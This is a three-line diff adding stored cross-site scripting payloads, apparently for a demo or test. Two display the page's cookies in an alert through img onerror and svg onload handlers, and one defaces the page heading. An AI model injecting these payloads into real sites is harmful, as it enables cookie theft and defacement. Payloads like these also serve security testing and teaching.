@@ -1,0 +1,3 @@
+<img src="x" onerror="alert('Stored XSS! Stolen Cookie: ' + document.cookie)">
+<svg onload="alert('SVG Stored XSS! Cookie: ' + document.cookie)">
+<img src="x" onerror="document.querySelector('h2').textContent='HACKED BY STORED XSS!'; document.body.style.background='#fecaca';">
